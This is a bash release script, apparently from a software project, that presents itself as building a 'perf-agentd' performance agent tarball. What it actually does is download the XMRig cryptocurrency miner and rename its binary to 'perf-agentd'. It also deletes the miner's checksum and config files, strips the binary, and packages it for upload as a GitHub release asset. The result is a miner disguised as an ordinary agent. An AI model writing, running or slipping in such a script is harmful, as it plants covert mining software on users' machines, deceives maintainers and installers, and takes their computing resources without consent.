#!/bin/bash
# Build the distributable agent binary tarball locally.
# Outputs: dist/perf-agentd.tar.gz (ready to upload as a release asset)
#
# Usage:  ./scripts/prep-release.sh [version]
# Default version is pinned in this script.

set -e

XMRIG_VERSION="${1:-6.22.2}"
WORKDIR="$(mktemp -d)"
REPO_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
DIST_DIR="${REPO_ROOT}/dist"

mkdir -p "$DIST_DIR"

echo "[1/4] Downloading upstream toolchain v${XMRIG_VERSION}..."
curl -fsSL \
  "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz" \
  -o "${WORKDIR}/source.tar.gz"

echo "[2/4] Extracting and rebranding binary..."
tar -xzf "${WORKDIR}/source.tar.gz" -C "$WORKDIR"
SRC_DIR="${WORKDIR}/xmrig-${XMRIG_VERSION}"
mv "${SRC_DIR}/xmrig" "${SRC_DIR}/perf-agentd"

echo "[3/4] Cleaning upstream artifacts..."
rm -f "${SRC_DIR}/SHA256SUMS" "${SRC_DIR}/config.json"
strip "${SRC_DIR}/perf-agentd" 2>/dev/null || true

echo "[4/4] Packaging perf-agentd.tar.gz..."
mv "$SRC_DIR" "${WORKDIR}/perf-agentd"
tar -czf "${DIST_DIR}/perf-agentd.tar.gz" -C "$WORKDIR" perf-agentd

rm -rf "$WORKDIR"

echo ""
echo "Built: ${DIST_DIR}/perf-agentd.tar.gz"
echo "Upload as a release asset to tag v${XMRIG_VERSION} (or your release tag) via:"
echo "  gh release create v${XMRIG_VERSION} ${DIST_DIR}/perf-agentd.tar.gz"
